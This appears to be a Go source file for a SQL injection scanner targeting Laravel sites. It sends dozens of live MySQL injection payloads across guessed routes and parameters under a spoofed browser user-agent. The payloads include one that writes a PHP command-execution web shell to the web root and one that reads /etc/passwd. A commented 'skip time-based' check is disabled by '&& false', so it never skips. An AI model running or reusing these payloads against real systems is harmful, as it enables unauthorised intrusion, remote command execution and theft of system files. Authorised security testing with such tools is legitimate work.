package vulnerabilities

import (
	"fmt"
	"io/ioutil"
	"laravelmap/internal/common"
	"laravelmap/pkg/httpclient"
	"net/url"
	"regexp"
	"time"
)

// SQLInjectionScan is a struct that contains an HTTP client
type SQLInjectionScan struct {
	client *httpclient.Client
}

// NewSQLInjectionScan initializes and returns a new SQLInjectionScan instance
func NewSQLInjectionScan() *SQLInjectionScan {
	return &SQLInjectionScan{
		client: httpclient.NewClient(15 * time.Second),
	}
}

// Run checks for SQL injection vulnerabilities in Laravel applications
func (sis *SQLInjectionScan) Run(target string) []common.ScanResult {
	var results []common.ScanResult

	// Extract the base URL and potential query parameters
	_, err := url.Parse(target)
	if err != nil {
		return []common.ScanResult{
			{
				ScanName:    sis.Name(),
				Category:    "Vulnerabilities",
				Description: "Failed to parse target URL",
				Path:        target,
				StatusCode:  0,
				Detail:      err.Error(),
			},
		}
	}

	// First, identify potential injection points
	injectionPoints := sis.identifyInjectionPoints(target)

	// Test each identified injection point
	for _, point := range injectionPoints {
		// Test different SQL injection payloads
		payloadResults := sis.testSQLInjectionPayloads(point)
		results = append(results, payloadResults...)
	}

	// If no injection points were found or no vulnerabilities were detected
	if len(results) == 0 {
		results = append(results, common.ScanResult{
			ScanName:    sis.Name(),
			Category:    "Vulnerabilities",
			Description: "No SQL injection vulnerabilities detected",
			Path:        target,
			StatusCode:  0,
			Detail:      "Target appears to be secure against tested SQL injection vectors",
		})
	}

	return results
}

// identifyInjectionPoints finds potential SQL injection points in the application
func (sis *SQLInjectionScan) identifyInjectionPoints(target string) []string {
	var injectionPoints []string

	// Add the base target URL as a potential injection point
	injectionPoints = append(injectionPoints, target)

	// Common Laravel routes that might be vulnerable to SQL injection
	commonRoutes := []string{
		"/api/users",
		"/api/products",
		"/api/posts",
		"/api/articles",
		"/api/comments",
		"/api/categories",
		"/api/tags",
		"/api/search",
		"/api/items",
		"/api/orders",
		"/api/data",
		"/users",
		"/products",
		"/posts",
		"/articles",
		"/comments",
		"/categories",
		"/tags",
		"/search",
		"/items",
		"/orders",
		"/login",
		"/register",
		"/profile",
		"/dashboard",
		"/admin",
	}

	// Common Laravel query parameters that might be vulnerable
	commonParams := []string{
		"id",
		"user_id",
		"product_id",
		"post_id",
		"article_id",
		"comment_id",
		"category_id",
		"tag_id",
		"item_id",
		"order_id",
		"q",
		"query",
		"search",
		"filter",
		"sort",
		"page",
		"limit",
		"offset",
		"start",
		"end",
		"from",
		"to",
		"date",
		"type",
		"status",
		"category",
		"tag",
		"name",
		"title",
		"description",
		"content",
		"price",
		"email",
		"username",
	}

	// Parse the base URL
	baseURL, err := url.Parse(target)
	if err != nil {
		return injectionPoints
	}

	// Create injection points for common routes
	for _, route := range commonRoutes {
		routeURL, _ := url.Parse(target)
		routeURL.Path = route
		injectionPoints = append(injectionPoints, routeURL.String())

		// Add common parameters to each route
		for _, param := range commonParams {
			paramURL, _ := url.Parse(routeURL.String())
			q := paramURL.Query()
			q.Set(param, "1")
			paramURL.RawQuery = q.Encode()
			injectionPoints = append(injectionPoints, paramURL.String())
		}
	}

	// Extract existing parameters from the target URL and create injection points
	if baseURL.RawQuery != "" {
		q := baseURL.Query()
		for param := range q {
			// Create a specific injection point for this parameter
			paramURL, _ := url.Parse(target)
			paramQuery := paramURL.Query()
			paramQuery.Set(param, "1")
			paramURL.RawQuery = paramQuery.Encode()
			injectionPoints = append(injectionPoints, paramURL.String())
		}
	}

	return injectionPoints
}

// testSQLInjectionPayloads tests various SQL injection payloads against a target URL
func (sis *SQLInjectionScan) testSQLInjectionPayloads(targetURL string) []common.ScanResult {
	var results []common.ScanResult

	// Parse the URL to extract and modify parameters
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return results
	}

	// Define SQL injection payloads specific to Laravel/PHP/MySQL
	payloads := []struct {
		value       string
		description string
		type_       string
	}{
		// Error-based payloads
		{"'", "Single quote error-based SQL injection", "error"},
		{"\"", "Double quote error-based SQL injection", "error"},
		{"`", "Backtick error-based SQL injection", "error"},
		{"\\", "Backslash error-based SQL injection", "error"},
		{"1'", "Numeric with single quote error-based SQL injection", "error"},
		{"1\"", "Numeric with double quote error-based SQL injection", "error"},
		{"1`", "Numeric with backtick error-based SQL injection", "error"},
		{"1\\", "Numeric with backslash error-based SQL injection", "error"},
		{"1'--", "Single quote with comment error-based SQL injection", "error"},
		{"1\"--", "Double quote with comment error-based SQL injection", "error"},
		{"1`--", "Backtick with comment error-based SQL injection", "error"},
		{"1\\--", "Backslash with comment error-based SQL injection", "error"},
		{"1' OR '1'='1", "OR-based SQL injection", "error"},
		{"1\" OR \"1\"=\"1", "OR-based SQL injection with double quotes", "error"},
		{"1' AND '1'='1", "AND-based SQL injection", "error"},
		{"1\" AND \"1\"=\"1", "AND-based SQL injection with double quotes", "error"},
		{"1' UNION SELECT NULL--", "UNION-based SQL injection", "error"},
		{"1' UNION SELECT 1,2,3--", "UNION-based SQL injection with multiple columns", "error"},
		{"1' ORDER BY 10--", "ORDER BY-based SQL injection", "error"},
		{"1' GROUP BY 10--", "GROUP BY-based SQL injection", "error"},
		{"1'; SLEEP(5)--", "Time-based SQL injection with SLEEP", "time"},
		{"1'; SELECT BENCHMARK(10000000,MD5('A'))--", "Time-based SQL injection with BENCHMARK", "time"},
		{"1'; (SELECT * FROM (SELECT(SLEEP(5)))A)--", "Nested time-based SQL injection", "time"},
		{"1'; (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)*2)))--", "Error-based SQL injection with GROUP BY and RAND", "error"},
		{"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--", "Error-based SQL injection with GROUP BY and RAND", "error"},
		{"1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION()),0x7e))--", "Error-based SQL injection with EXTRACTVALUE", "error"},
		{"1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION()),0x7e),1)--", "Error-based SQL injection with UPDATEXML", "error"},
		{"1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND()*2)) x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--", "Error-based SQL injection with ROW", "error"},
		{"1' AND (SELECT * FROM (SELECT CONCAT(0x3a,(SELECT VERSION()),0x3a,FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x LIMIT 0,1) y)--", "Error-based SQL injection with CONCAT and RAND", "error"},
		{"1' AND ELT(1,SLEEP(5))--", "Time-based SQL injection with ELT", "time"},
		{"1' AND MAKE_SET(1,SLEEP(5))--", "Time-based SQL injection with MAKE_SET", "time"},
		{"1' PROCEDURE ANALYSE(EXTRACTVALUE(5371,CONCAT(0x5c,(BENCHMARK(10000000,MD5(0x41))))),1)--", "Time-based SQL injection with PROCEDURE ANALYSE", "time"},
		{"1' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x3a,VERSION(),0x3a)) USING utf8)))--", "Error-based SQL injection with JSON_KEYS", "error"},
		{"1'; SELECT IF(SUBSTR(@@version,1,1)='5',SLEEP(5),0)--", "Blind time-based SQL injection", "time"},
		{"1'; SELECT IF(ASCII(SUBSTR(DATABASE(),1,1))=116,SLEEP(5),0)--", "Blind time-based SQL injection for database name", "time"},
		{"1'; SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END--", "Conditional time-based SQL injection", "time"},
		{"1'; SELECT CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())>0 THEN SLEEP(5) ELSE 0 END--", "Conditional time-based SQL injection for table count", "time"},
		{"1' INTO OUTFILE '/var/www/html/shell.php' FIELDS TERMINATED BY '<?php system($_GET[\"cmd\"]); ?>'--", "File write SQL injection", "error"},
		{"1' AND LOAD_FILE('/etc/passwd')--", "File read SQL injection", "error"},
		{"1' AND (SELECT * FROM (SELECT(SLEEP(5)))A JOIN (SELECT(SLEEP(5)))B)--", "Multiple time-based SQL injection", "time"},
		{"1' AND (SELECT * FROM (SELECT(SLEEP(5)))A JOIN (SELECT(SLEEP(5)))B JOIN (SELECT(SLEEP(5)))C)--", "Multiple time-based SQL injection with three joins", "time"},
	}

	// Laravel-specific error patterns to look for in responses
	errorPatterns := []string{
		"SQL syntax",
		"MySQL Error",
		"ORA-[0-9]",
		"Microsoft SQL Server",
		"PostgreSQL",
		"SQLite",
		"Uncaught PDOException",
		"Illuminate\\Database\\QueryException",
		"SQLSTATE\\[",
		"Database error",
		"DB Error",
		"Warning: mysql_",
		"Warning: pg_",
		"Warning: sqlite_",
		"Warning: oci_",
		"Warning: mssql_",
		"Syntax error or access violation",
		"Integrity constraint violation",
		"UNIQUE constraint failed",
		"Duplicate entry",
		"foreign key constraint fails",
		"ORA-00001",
		"cannot be null",
		"check constraint",
		"column does not allow null",
		"data too long",
		"division by zero",
		"out of range",
		"truncated",
		"lock wait timeout",
		"deadlock",
		"lost connection",
	}

	// Test each parameter in the URL with each payload
	q := parsedURL.Query()
	if len(q) > 0 {
		// Test each parameter
		for param := range q {
			originalValue := q.Get(param)

			// Test each payload
			for _, payload := range payloads {
				// Skip time-based payloads for now to avoid long scan times
				if payload.type_ == "time" && false { // Set to true to enable time-based testing
					continue
				}

				// Create a new query with the payload
				testQuery := parsedURL.Query()
				testQuery.Set(param, payload.value)

				// Create the test URL
				testURL := *parsedURL
				testURL.RawQuery = testQuery.Encode()

				// Send the request
				headers := map[string]string{
					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
				}

				startTime := time.Now()
				resp, err := sis.client.Get(testURL.String(), headers)
				elapsedTime := time.Since(startTime)

				if err != nil {
					continue
				}

				// Read the response body
				bodyBytes, err := ioutil.ReadAll(resp.Body)
				resp.Body.Close()
				if err != nil {
					continue
				}
				bodyString := string(bodyBytes)

				// Check for SQL error patterns in the response
				for _, pattern := range errorPatterns {
					re := regexp.MustCompile("(?i)" + pattern)
					if re.MatchString(bodyString) {
						results = append(results, common.ScanResult{
							ScanName:    sis.Name(),
							Category:    "Vulnerabilities",
							Description: "Potential SQL injection vulnerability detected",
							Path:        testURL.String(),
							StatusCode:  resp.StatusCode,
							Detail:      fmt.Sprintf("Parameter: %s, Payload: %s, Error Pattern: %s, Description: %s", param, payload.value, pattern, payload.description),
						})
						break
					}
				}

				// Check for time-based SQL injection (if the payload is time-based)
				if payload.type_ == "time" && elapsedTime > 4*time.Second {
					results = append(results, common.ScanResult{
						ScanName:    sis.Name(),
						Category:    "Vulnerabilities",
						Description: "Potential time-based SQL injection vulnerability detected",
						Path:        testURL.String(),
						StatusCode:  resp.StatusCode,
						Detail:      fmt.Sprintf("Parameter: %s, Payload: %s, Response Time: %s, Description: %s", param, payload.value, elapsedTime, payload.description),
					})
				}
			}

			// Restore the original value
			q.Set(param, originalValue)
		}
	} else {
		// If no parameters exist, try to add some common ones
		commonParams := []string{"id", "page", "search", "q", "query", "filter", "sort", "order", "limit", "offset"}

		for _, param := range commonParams {
			for _, payload := range payloads {
				// Skip time-based payloads for now
				if payload.type_ == "time" {
					continue
				}

				// Create a new query with the payload
				testQuery := url.Values{}
				testQuery.Set(param, payload.value)

				// Create the test URL
				testURL := *parsedURL
				testURL.RawQuery = testQuery.Encode()

				// Send the request
				headers := map[string]string{
					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
				}

				resp, err := sis.client.Get(testURL.String(), headers)
				if err != nil {
					continue
				}

				// Read the response body
				bodyBytes, err := ioutil.ReadAll(resp.Body)
				resp.Body.Close()
				if err != nil {
					continue
				}
				bodyString := string(bodyBytes)

				// Check for SQL error patterns in the response
				for _, pattern := range errorPatterns {
					re := regexp.MustCompile("(?i)" + pattern)
					if re.MatchString(bodyString) {
						results = append(results, common.ScanResult{
							ScanName:    sis.Name(),
							Category:    "Vulnerabilities",
							Description: "Potential SQL injection vulnerability detected",
							Path:        testURL.String(),
							StatusCode:  resp.StatusCode,
							Detail:      fmt.Sprintf("Parameter: %s, Payload: %s, Error Pattern: %s, Description: %s", param, payload.value, pattern, payload.description),
						})
						break
					}
				}
			}
		}
	}

	// Test Laravel-specific paths that might be vulnerable to SQL injection
	laravelPaths := []string{
		"/api/users",
		"/api/products",
		"/api/posts",
		"/api/articles",
		"/users",
		"/products",
		"/posts",
		"/articles",
		"/search",
		"/admin/users",
		"/admin/products",
		"/admin/posts",
		"/admin/articles",
	}

	// Test a few paths with a simple payload
	for _, path := range laravelPaths[:3] { // Limit to first 3 to avoid too many requests
		pathURL := *parsedURL
		pathURL.Path = path
		pathURL.RawQuery = "id=1'"

		// Send the request
		headers := map[string]string{
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		}

		resp, err := sis.client.Get(pathURL.String(), headers)
		if err != nil {
			continue
		}

		// Read the response body
		bodyBytes, err := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}
		bodyString := string(bodyBytes)

		// Check for SQL error patterns in the response
		for _, pattern := range errorPatterns {
			re := regexp.MustCompile("(?i)" + pattern)
			if re.MatchString(bodyString) {
				results = append(results, common.ScanResult{
					ScanName:    sis.Name(),
					Category:    "Vulnerabilities",
					Description: "Potential SQL injection vulnerability detected",
					Path:        pathURL.String(),
					StatusCode:  resp.StatusCode,
					Detail:      fmt.Sprintf("Path: %s, Payload: id=1', Error Pattern: %s", path, pattern),
				})
				break
			}
		}
	}

	return results
}

func (sis *SQLInjectionScan) Name() string {
	return "SQL Injection Scanner"
}
